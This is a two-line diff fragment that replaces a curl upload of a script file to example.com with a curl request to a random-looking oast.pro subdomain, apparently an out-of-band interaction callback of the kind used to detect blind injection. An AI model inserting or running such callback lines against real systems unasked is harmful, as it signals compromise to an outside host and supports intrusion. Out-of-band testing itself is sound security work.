@@ -1,3 +1,2 @@
-curl -X POST https://example.com/api/upload \
-     -H "Content-Type: text/javascript" \
-     --data-binary @script.js
+curl -X GET czn7ca1z1wg0000gd0m0gx4usfyyyyyyb.oast.pro\
+     -H "Content-Type: image/png"
